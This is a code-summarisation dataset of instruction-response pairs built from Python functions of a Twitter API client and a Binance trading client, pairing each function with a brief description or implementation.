{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef media_upload(self, filename, *args, **kwargs):\n        f = kwargs.pop('file', None)\n        headers, post_data = API._pack_image(filename, 4883, form_field='media', f=f)\n        kwargs.update({'headers': headers, 'post_data': post_data})\n\n        return bind_api(\n            api=self,\n            path='/media/upload.json',\n            method='POST',\n            payload_type='media',\n            allowed_param=[],\n            require_auth=True,\n            upload_api=True\n        )(*args, **kwargs)", "response": "Upload a media file to the user s twitter account."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndestroy a status from a specific post", "response": "def destroy_status(self):\n        \"\"\" :reference: https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/post-statuses-destroy-id\n            :allowed_param:'id'\n        \"\"\"\n        return bind_api(\n            api=self,\n            path='/statuses/destroy/{id}.json',\n            method='POST',\n            payload_type='status',\n            allowed_param=['id'],\n            require_auth=True\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef lookup_users(self, user_ids=None, screen_names=None, include_entities=None, tweet_mode=None):\n        post_data = {}\n        if include_entities is not None:\n            include_entities = 'true' if include_entities else 'false'\n            post_data['include_entities'] = include_entities\n        if user_ids:\n            post_data['user_id'] = list_to_csv(user_ids)\n        if screen_names:\n            post_data['screen_name'] = list_to_csv(screen_names)\n        if tweet_mode:\n            post_data['tweet_mode'] = tweet_mode\n\n        return self._lookup_users(post_data=post_data)", "response": "Perform bulk lookup of users from user ID or screen name"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef search_users(self):\n        return bind_api(\n            api=self,\n            path='/users/search.json',\n            payload_type='user', payload_list=True,\n            require_auth=True,\n            allowed_param=['q', 'count', 'page']\n        )", "response": "Search for users in the user list."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_direct_message(self):\n        return bind_api(\n            api=self,\n            path='/direct_messages/show/{id}.json',\n            payload_type='direct_message',\n            allowed_param=['id', 'full_text'],\n            require_auth=True\n        )", "response": "Get a direct message from the user."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef lookup_friendships(self, user_ids=None, screen_names=None):\n        return self._lookup_friendships(list_to_csv(user_ids), list_to_csv(screen_names))", "response": "Perform bulk lookup of friendships from user ID or screenname"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_settings(self):\n        return bind_api(\n            api=self,\n            path='/account/settings.json',\n            method='POST',\n            payload_type='json',\n            allowed_param=['sleep_time_enabled', 'start_sleep_time',\n                           'end_sleep_time', 'time_zone',\n                           'trend_location_woeid', 'allow_contributor_request',\n                           'lang'],\n            use_cache=False\n        )", "response": "Set settings for the current user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nverifying credentials for a user.", "response": "def verify_credentials(self, **kargs):\n        \"\"\" :reference: https://developer.twitter.com/en/docs/accounts-and-users/manage-account-settings/api-reference/get-account-verify_credentials\n            :allowed_param:'include_entities', 'skip_status', 'include_email'\n        \"\"\"\n        try:\n            return bind_api(\n                api=self,\n                path='/account/verify_credentials.json',\n                payload_type='user',\n                require_auth=True,\n                allowed_param=['include_entities', 'skip_status', 'include_email'],\n            )(**kargs)\n        except TweepError as e:\n            if e.response and e.response.status == 401:\n                return False\n            raise"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef rate_limit_status(self):\n        return bind_api(\n            api=self,\n            path='/application/rate_limit_status.json',\n            payload_type='json',\n            allowed_param=['resources'],\n            use_cache=False\n        )", "response": "Get the status of the application rate limit."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting a list of all the user s favorites.", "response": "def favorites(self):\n        \"\"\" :reference: https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/get-favorites-list\n            :allowed_param:'screen_name', 'user_id', 'max_id', 'count', 'since_id', 'max_id'\n        \"\"\"\n        return bind_api(\n            api=self,\n            path='/favorites/list.json',\n            payload_type='status', payload_list=True,\n            allowed_param=['screen_name', 'user_id', 'max_id', 'count', 'since_id', 'max_id']\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef saved_searches(self):\n        return bind_api(\n            api=self,\n            path='/saved_searches/list.json',\n            payload_type='saved_search', payload_list=True,\n            require_auth=True\n        )", "response": "Get a list of saved searches for the current user."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_list_members(self, screen_name=None, user_id=None, slug=None,\n                         list_id=None, owner_id=None, owner_screen_name=None):\n        \"\"\" Perform bulk add of list members from user ID or screenname \"\"\"\n        return self._add_list_members(list_to_csv(screen_name),\n                                      list_to_csv(user_id),\n                                      slug, list_id, owner_id,\n                                      owner_screen_name)", "response": "Perform bulk add of list members from user ID or screenname"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nperform bulk remove of list members from user ID or screenname", "response": "def remove_list_members(self, screen_name=None, user_id=None, slug=None,\n                            list_id=None, owner_id=None, owner_screen_name=None):\n        \"\"\" Perform bulk remove of list members from user ID or screenname \"\"\"\n        return self._remove_list_members(list_to_csv(screen_name),\n                                         list_to_csv(user_id),\n                                         slug, list_id, owner_id,\n                                         owner_screen_name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef on_data(self, raw_data):\n        data = json.loads(raw_data)\n\n        if 'in_reply_to_status_id' in data:\n            status = Status.parse(self.api, data)\n            if self.on_status(status) is False:\n                return False\n        elif 'delete' in data:\n            delete = data['delete']['status']\n            if self.on_delete(delete['id'], delete['user_id']) is False:\n                return False\n        elif 'event' in data:\n            status = Status.parse(self.api, data)\n            if self.on_event(status) is False:\n                return False\n        elif 'direct_message' in data:\n            status = Status.parse(self.api, data)\n            if self.on_direct_message(status) is False:\n                return False\n        elif 'friends' in data:\n            if self.on_friends(data['friends']) is False:\n                return False\n        elif 'limit' in data:\n            if self.on_limit(data['limit']['track']) is False:\n                return False\n        elif 'disconnect' in data:\n            if self.on_disconnect(data['disconnect']) is False:\n                return False\n        elif 'warning' in data:\n            if self.on_warning(data['warning']) is False:\n                return False\n        else:\n            logging.error(\"Unknown message type: \" + str(raw_data))", "response": "Called when raw data is received from the connection. Return False to stop stream and close connection."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreads the data stream until a given separator is found.", "response": "def read_line(self, sep=six.b('\\n')):\n        \"\"\"Read the data stream until a given separator is found (default \\n)\n\n        :param sep: Separator to read until. Must by of the bytes type (str in python 2,\n            bytes in python 3)\n        :return: The str of the data read until sep\n        \"\"\"\n        start = 0\n        while not self._stream.closed:\n            loc = self._buffer.find(sep, start)\n            if loc >= 0:\n                return self._pop(loc + len(sep))\n            else:\n                start = len(self._buffer)\n            self._buffer += self._stream.read(self._chunk_size)\n        return six.b('')"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns iterator for pages", "response": "def pages(self, limit=0):\n        \"\"\"Return iterator for pages\"\"\"\n        if limit > 0:\n            self.iterator.limit = limit\n        return self.iterator"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning iterator for items in each page", "response": "def items(self, limit=0):\n        \"\"\"Return iterator for items in each page\"\"\"\n        i = ItemIterator(self.iterator)\n        i.limit = limit\n        return i"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef next(self):\n        if self.limit and self.limit == self.num_tweets:\n            raise StopIteration\n\n        if self.index >= len(self.results) - 1:\n            data = self.method(max_id=self.max_id, parser=RawParser(), *self.args, **self.kargs)\n\n            if hasattr(self.method, '__self__'):\n                old_parser = self.method.__self__.parser\n                # Hack for models which expect ModelParser to be set\n                self.method.__self__.parser = ModelParser()\n\n            # This is a special invocation that returns the underlying\n            # APIMethod class\n            model = ModelParser().parse(self.method(create=True), data)\n            if hasattr(self.method, '__self__'):\n                self.method.__self__.parser = old_parser\n                result = self.method.__self__.parser.parse(self.method(create=True), data)\n            else:\n                result = model\n\n            if len(self.results) != 0:\n                self.index += 1\n            self.results.append(result)\n            self.model_results.append(model)\n        else:\n            self.index += 1\n            result = self.results[self.index]\n            model = self.model_results[self.index]\n\n        if len(result) == 0:\n            raise StopIteration\n        # TODO: Make this not dependant on the parser making max_id and\n        # since_id available\n        self.max_id = model.max_id\n        self.num_tweets += 1\n        return result", "response": "Fetch a set of items with IDs less than current set."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a set of items with IDs greater than current set.", "response": "def prev(self):\n        \"\"\"Fetch a set of items with IDs greater than current set.\"\"\"\n        if self.limit and self.limit == self.num_tweets:\n            raise StopIteration\n\n        self.index -= 1\n        if self.index < 0:\n            # There's no way to fetch a set of tweets directly 'above' the\n            # current set\n            raise StopIteration\n\n        data = self.results[self.index]\n        self.max_id = self.model_results[self.index].max_id\n        self.num_tweets += 1\n        return data"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding a bid to the cache.", "response": "def add_bid(self, bid):\n        \"\"\"Add a bid to the cache\n\n        :param bid:\n        :return:\n\n        \"\"\"\n        self._bids[bid[0]] = float(bid[1])\n        if bid[1] == \"0.00000000\":\n            del self._bids[bid[0]]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd an ask to the cache", "response": "def add_ask(self, ask):\n        \"\"\"Add an ask to the cache\n\n        :param ask:\n        :return:\n\n        \"\"\"\n        self._asks[ask[0]] = float(ask[1])\n        if ask[1] == \"0.00000000\":\n            del self._asks[ask[0]]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef sort_depth(vals, reverse=False):\n        lst = [[float(price), quantity] for price, quantity in vals.items()]\n        lst = sorted(lst, key=itemgetter(0), reverse=reverse)\n        return lst", "response": "Sort bids or asks by price"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _init_cache(self):\n        self._last_update_id = None\n        self._depth_message_buffer = []\n\n        res = self._client.get_order_book(symbol=self._symbol, limit=self._limit)\n\n        # process bid and asks from the order book\n        for bid in res['bids']:\n            self._depth_cache.add_bid(bid)\n        for ask in res['asks']:\n            self._depth_cache.add_ask(ask)\n\n        # set first update id\n        self._last_update_id = res['lastUpdateId']\n\n        # set a time to refresh the depth cache\n        if self._refresh_interval:\n            self._refresh_time = int(time.time()) + self._refresh_interval\n\n        # Apply any updates from the websocket\n        for msg in self._depth_message_buffer:\n            self._process_depth_message(msg, buffer=True)\n\n        # clear the depth buffer\n        del self._depth_message_buffer", "response": "Initialise the depth cache calling REST endpoint\n\n       "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstart the depth cache socket", "response": "def _start_socket(self):\n        \"\"\"Start the depth cache socket\n\n        :return:\n        \"\"\"\n        if self._bm is None:\n            self._bm = BinanceSocketManager(self._client)\n\n        self._conn_key = self._bm.start_depth_socket(self._symbol, self._depth_event)\n        if not self._bm.is_alive():\n            self._bm.start()\n\n        # wait for some socket responses\n        while not len(self._depth_message_buffer):\n            time.sleep(1)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _depth_event(self, msg):\n\n        if 'e' in msg and msg['e'] == 'error':\n            # close the socket\n            self.close()\n\n            # notify the user by returning a None value\n            if self._callback:\n                self._callback(None)\n\n        if self._last_update_id is None:\n            # Initial depth snapshot fetch not yet performed, buffer messages\n            self._depth_message_buffer.append(msg)\n        else:\n            self._process_depth_message(msg)", "response": "Handle a depth event."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _process_depth_message(self, msg, buffer=False):\n\n        if buffer and msg['u'] <= self._last_update_id:\n            # ignore any updates before the initial update id\n            return\n        elif msg['U'] != self._last_update_id + 1:\n            # if not buffered check we get sequential updates\n            # otherwise init cache again\n            self._init_cache()\n\n        # add any bid or ask values\n        for bid in msg['b']:\n            self._depth_cache.add_bid(bid)\n        for ask in msg['a']:\n            self._depth_cache.add_ask(ask)\n\n        # keeping update time\n        self._depth_cache.update_time = msg['E']\n\n        # call the callback with the updated depth cache\n        if self._callback:\n            self._callback(self._depth_cache)\n\n        self._last_update_id = msg['u']\n\n        # after processing event see if we need to refresh the depth cache\n        if self._refresh_interval and int(time.time()) > self._refresh_time:\n            self._init_cache()", "response": "Process a depth event message."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef close(self, close_socket=False):\n        self._bm.stop_socket(self._conn_key)\n        if close_socket:\n            self._bm.close()\n        time.sleep(1)\n        self._depth_cache = None", "response": "Close the open socket for this manager."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef date_to_milliseconds(date_str):\n    # get epoch value in UTC\n    epoch = datetime.utcfromtimestamp(0).replace(tzinfo=pytz.utc)\n    # parse our date string\n    d = dateparser.parse(date_str)\n    # if the date is not timezone aware apply UTC timezone\n    if d.tzinfo is None or d.tzinfo.utcoffset(d) is None:\n        d = d.replace(tzinfo=pytz.utc)\n\n    # return the difference in time\n    return int((d - epoch).total_seconds() * 1000.0)", "response": "Convert a UTC date to milliseconds"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef interval_to_milliseconds(interval):\n    ms = None\n    seconds_per_unit = {\n        \"m\": 60,\n        \"h\": 60 * 60,\n        \"d\": 24 * 60 * 60,\n        \"w\": 7 * 24 * 60 * 60\n    }\n\n    unit = interval[-1]\n    if unit in seconds_per_unit:\n        try:\n            ms = int(interval[:-1]) * seconds_per_unit[unit] * 1000\n        except ValueError:\n            pass\n    return ms", "response": "Convert a Binance interval string to milliseconds"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the Historical Klines from Binance", "response": "def get_historical_klines(symbol, interval, start_str, end_str=None):\n    \"\"\"Get Historical Klines from Binance\n\n    See dateparse docs for valid start and end string formats http://dateparser.readthedocs.io/en/latest/\n\n    If using offset strings for dates add \"UTC\" to date string e.g. \"now UTC\", \"11 hours ago UTC\"\n\n    :param symbol: Name of symbol pair e.g BNBBTC\n    :type symbol: str\n    :param interval: Biannce Kline interval\n    :type interval: str\n    :param start_str: Start date string in UTC format\n    :type start_str: str\n    :param end_str: optional - end date string in UTC format\n    :type end_str: str\n\n    :return: list of OHLCV values\n\n    \"\"\"\n    # create the Binance client, no need for api key\n    client = Client(\"\", \"\")\n\n    # init our list\n    output_data = []\n\n    # setup the max limit\n    limit = 500\n\n    # convert interval to useful value in seconds\n    timeframe = interval_to_milliseconds(interval)\n\n    # convert our date strings to milliseconds\n    start_ts = date_to_milliseconds(start_str)\n\n    # if an end time was passed convert it\n    end_ts = None\n    if end_str:\n        end_ts = date_to_milliseconds(end_str)\n\n    idx = 0\n    # it can be difficult to know when a symbol was listed on Binance so allow start time to be before list date\n    symbol_existed = False\n    while True:\n        # fetch the klines from start_ts up to max 500 entries or the end_ts if set\n        temp_data = client.get_klines(\n            symbol=symbol,\n            interval=interval,\n            limit=limit,\n            startTime=start_ts,\n            endTime=end_ts\n        )\n\n        # handle the case where our start date is before the symbol pair listed on Binance\n        if not symbol_existed and len(temp_data):\n            symbol_existed = True\n\n        if symbol_existed:\n            # append this loops data to our output data\n            output_data += temp_data\n\n            # update our start timestamp using the last value in the array and add the interval timeframe\n            start_ts = temp_data[len(temp_data) - 1][0] + timeframe\n        else:\n            # it wasn't listed yet, increment our start date\n            start_ts += timeframe\n\n        idx += 1\n        # check if we received less than the required limit and exit the loop\n        if len(temp_data) < limit:\n            # exit the while loop\n            break\n\n        # sleep after every 3rd call to be kind to the API\n        if idx % 3 == 0:\n            time.sleep(1)\n\n    return output_data"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts params to list with signature as last element", "response": "def _order_params(self, data):\n        \"\"\"Convert params to list with signature as last element\n\n        :param data:\n        :return:\n\n        \"\"\"\n        has_signature = False\n        params = []\n        for key, value in data.items():\n            if key == 'signature':\n                has_signature = True\n            else:\n                params.append((key, value))\n        # sort parameters by key\n        params.sort(key=itemgetter(0))\n        if has_signature:\n            params.append(('signature', data['signature']))\n        return params"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn information about a symbol in the BNBBTC.", "response": "def get_symbol_info(self, symbol):\n        \"\"\"Return information about a symbol\n\n        :param symbol: required e.g BNBBTC\n        :type symbol: str\n\n        :returns: Dict if found, None if not\n\n        .. code-block:: python\n\n            {\n                \"symbol\": \"ETHBTC\",\n                \"status\": \"TRADING\",\n                \"baseAsset\": \"ETH\",\n                \"baseAssetPrecision\": 8,\n                \"quoteAsset\": \"BTC\",\n                \"quotePrecision\": 8,\n                \"orderTypes\": [\"LIMIT\", \"MARKET\"],\n                \"icebergAllowed\": false,\n                \"filters\": [\n                    {\n                        \"filterType\": \"PRICE_FILTER\",\n                        \"minPrice\": \"0.00000100\",\n                        \"maxPrice\": \"100000.00000000\",\n                        \"tickSize\": \"0.00000100\"\n                    }, {\n                        \"filterType\": \"LOT_SIZE\",\n                        \"minQty\": \"0.00100000\",\n                        \"maxQty\": \"100000.00000000\",\n                        \"stepSize\": \"0.00100000\"\n                    }, {\n                        \"filterType\": \"MIN_NOTIONAL\",\n                        \"minNotional\": \"0.00100000\"\n                    }\n                ]\n            }\n\n        :raises: BinanceRequestException, BinanceAPIException\n\n        \"\"\"\n\n        res = self._get('exchangeInfo')\n\n        for item in res['symbols']:\n            if item['symbol'] == symbol.upper():\n                return item\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef aggregate_trade_iter(self, symbol, start_str=None, last_id=None):\n        if start_str is not None and last_id is not None:\n            raise ValueError(\n                'start_time and last_id may not be simultaneously specified.')\n\n        # If there's no last_id, get one.\n        if last_id is None:\n            # Without a last_id, we actually need the first trade.  Normally,\n            # we'd get rid of it. See the next loop.\n            if start_str is None:\n                trades = self.get_aggregate_trades(symbol=symbol, fromId=0)\n            else:\n                # The difference between startTime and endTime should be less\n                # or equal than an hour and the result set should contain at\n                # least one trade.\n                if type(start_str) == int:\n                    start_ts = start_str\n                else:\n                    start_ts = date_to_milliseconds(start_str)\n                # If the resulting set is empty (i.e. no trades in that interval)\n                # then we just move forward hour by hour until we find at least one\n                # trade or reach present moment\n                while True:\n                    end_ts = start_ts + (60 * 60 * 1000)\n                    trades = self.get_aggregate_trades(\n                        symbol=symbol,\n                        startTime=start_ts,\n                        endTime=end_ts)\n                    if len(trades) > 0:\n                        break\n                    # If we reach present moment and find no trades then there is\n                    # nothing to iterate, so we're done\n                    if end_ts > int(time.time() * 1000):\n                        return\n                    start_ts = end_ts\n            for t in trades:\n                yield t\n            last_id = trades[-1][self.AGG_ID]\n\n        while True:\n            # There is no need to wait between queries, to avoid hitting the\n            # rate limit. We're using blocking IO, and as long as we're the\n            # only thread running calls like this, Binance will automatically\n            # add the right delay time on their end, forcing us to wait for\n            # data. That really simplifies this function's job. Binance is\n            # fucking awesome.\n            trades = self.get_aggregate_trades(symbol=symbol, fromId=last_id)\n            # fromId=n returns a set starting with id n, but we already have\n            # that one. So get rid of the first item in the result set.\n            trades = trades[1:]\n            if len(trades) == 0:\n                return\n            for t in trades:\n                yield t\n            last_id = trades[-1][self.AGG_ID]", "response": "Iterate over aggregate trade data from start_str or last_id."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_earliest_valid_timestamp(self, symbol, interval):\n        kline = self.get_klines(\n            symbol=symbol,\n            interval=interval,\n            limit=1,\n            startTime=0,\n            endTime=None\n        )\n        return kline[0][0]", "response": "Get earliest valid open timestamp from Binance Kline"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget the historical klines from the Binance entry table.", "response": "def get_historical_klines(self, symbol, interval, start_str, end_str=None,\n                              limit=500):\n        \"\"\"Get Historical Klines from Binance\n\n        See dateparser docs for valid start and end string formats http://dateparser.readthedocs.io/en/latest/\n\n        If using offset strings for dates add \"UTC\" to date string e.g. \"now UTC\", \"11 hours ago UTC\"\n\n        :param symbol: Name of symbol pair e.g BNBBTC\n        :type symbol: str\n        :param interval: Binance Kline interval\n        :type interval: str\n        :param start_str: Start date string in UTC format or timestamp in milliseconds\n        :type start_str: str|int\n        :param end_str: optional - end date string in UTC format or timestamp in milliseconds (default will fetch everything up to now)\n        :type end_str: str|int\n        :param limit: Default 500; max 1000.\n        :type limit: int\n\n        :return: list of OHLCV values\n\n        \"\"\"\n        # init our list\n        output_data = []\n\n        # setup the max limit\n        limit = limit\n\n        # convert interval to useful value in seconds\n        timeframe = interval_to_milliseconds(interval)\n\n        # convert our date strings to milliseconds\n        if type(start_str) == int:\n            start_ts = start_str\n        else:\n            start_ts = date_to_milliseconds(start_str)\n\n        # establish first available start timestamp\n        first_valid_ts = self._get_earliest_valid_timestamp(symbol, interval)\n        start_ts = max(start_ts, first_valid_ts)\n\n        # if an end time was passed convert it\n        end_ts = None\n        if end_str:\n            if type(end_str) == int:\n                end_ts = end_str\n            else:\n                end_ts = date_to_milliseconds(end_str)\n\n        idx = 0\n        while True:\n            # fetch the klines from start_ts up to max 500 entries or the end_ts if set\n            temp_data = self.get_klines(\n                symbol=symbol,\n                interval=interval,\n                limit=limit,\n                startTime=start_ts,\n                endTime=end_ts\n            )\n\n            # handle the case where exactly the limit amount of data was returned last loop\n            if not len(temp_data):\n                break\n\n            # append this loops data to our output data\n            output_data += temp_data\n\n            # set our start timestamp using the last value in the array\n            start_ts = temp_data[-1][0]\n\n            idx += 1\n            # check if we received less than the required limit and exit the loop\n            if len(temp_data) < limit:\n                # exit the while loop\n                break\n\n            # increment next call by our timeframe\n            start_ts += timeframe\n\n            # sleep after every 3rd call to be kind to the API\n            if idx % 3 == 0:\n                time.sleep(1)\n\n        return output_data"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_symbol_ticker(self, **params):\n        return self._get('ticker/price', data=params, version=self.PRIVATE_API_VERSION)", "response": "Get the latest price for a symbol or symbols."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_orderbook_ticker(self, **params):\n        return self._get('ticker/bookTicker', data=params, version=self.PRIVATE_API_VERSION)", "response": "Get the latest price for a symbol or symbols."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsends in a new limit order", "response": "def order_limit(self, timeInForce=TIME_IN_FORCE_GTC, **params):\n        \"\"\"Send in a new limit order\n\n        Any order with an icebergQty MUST have timeInForce set to GTC.\n\n        :param symbol: required\n        :type symbol: str\n        :param side: required\n        :type side: str\n        :param quantity: required\n        :type quantity: decimal\n        :param price: required\n        :type price: str\n        :param timeInForce: default Good till cancelled\n        :type timeInForce: str\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param icebergQty: Used with LIMIT, STOP_LOSS_LIMIT, and TAKE_PROFIT_LIMIT to create an iceberg order.\n        :type icebergQty: decimal\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'type': self.ORDER_TYPE_LIMIT,\n            'timeInForce': timeInForce\n        })\n        return self.create_order(**params)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsend in a new limit buy order", "response": "def order_limit_buy(self, timeInForce=TIME_IN_FORCE_GTC, **params):\n        \"\"\"Send in a new limit buy order\n\n        Any order with an icebergQty MUST have timeInForce set to GTC.\n\n        :param symbol: required\n        :type symbol: str\n        :param quantity: required\n        :type quantity: decimal\n        :param price: required\n        :type price: str\n        :param timeInForce: default Good till cancelled\n        :type timeInForce: str\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param stopPrice: Used with stop orders\n        :type stopPrice: decimal\n        :param icebergQty: Used with iceberg orders\n        :type icebergQty: decimal\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'side': self.SIDE_BUY,\n        })\n        return self.order_limit(timeInForce=timeInForce, **params)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend in a new limit sell order", "response": "def order_limit_sell(self, timeInForce=TIME_IN_FORCE_GTC, **params):\n        \"\"\"Send in a new limit sell order\n\n        :param symbol: required\n        :type symbol: str\n        :param quantity: required\n        :type quantity: decimal\n        :param price: required\n        :type price: str\n        :param timeInForce: default Good till cancelled\n        :type timeInForce: str\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param stopPrice: Used with stop orders\n        :type stopPrice: decimal\n        :param icebergQty: Used with iceberg orders\n        :type icebergQty: decimal\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'side': self.SIDE_SELL\n        })\n        return self.order_limit(timeInForce=timeInForce, **params)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsending in a new market order", "response": "def order_market(self, **params):\n        \"\"\"Send in a new market order\n\n        :param symbol: required\n        :type symbol: str\n        :param side: required\n        :type side: str\n        :param quantity: required\n        :type quantity: decimal\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'type': self.ORDER_TYPE_MARKET\n        })\n        return self.create_order(**params)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsending in a new market buy order", "response": "def order_market_buy(self, **params):\n        \"\"\"Send in a new market buy order\n\n        :param symbol: required\n        :type symbol: str\n        :param quantity: required\n        :type quantity: decimal\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'side': self.SIDE_BUY\n        })\n        return self.order_market(**params)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsending in a new market sell order", "response": "def order_market_sell(self, **params):\n        \"\"\"Send in a new market sell order\n\n        :param symbol: required\n        :type symbol: str\n        :param quantity: required\n        :type quantity: decimal\n        :param newClientOrderId: A unique id for the order. Automatically generated if not sent.\n        :type newClientOrderId: str\n        :param newOrderRespType: Set the response JSON. ACK, RESULT, or FULL; default: RESULT.\n        :type newOrderRespType: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        See order endpoint for full response options\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceOrderException, BinanceOrderMinAmountException, BinanceOrderMinPriceException, BinanceOrderMinTotalException, BinanceOrderUnknownSymbolException, BinanceOrderInactiveSymbolException\n\n        \"\"\"\n        params.update({\n            'side': self.SIDE_SELL\n        })\n        return self.order_market(**params)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_asset_balance(self, asset, **params):\n        res = self.get_account(**params)\n        # find asset balance in list of balances\n        if \"balances\" in res:\n            for bal in res['balances']:\n                if bal['asset'].lower() == asset.lower():\n                    return bal\n        return None", "response": "Get current asset balance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_account_status(self, **params):\n        res = self._request_withdraw_api('get', 'accountStatus.html', True, data=params)\n        if not res['success']:\n            raise BinanceWithdrawException(res['msg'])\n        return res", "response": "Get account status detail."}
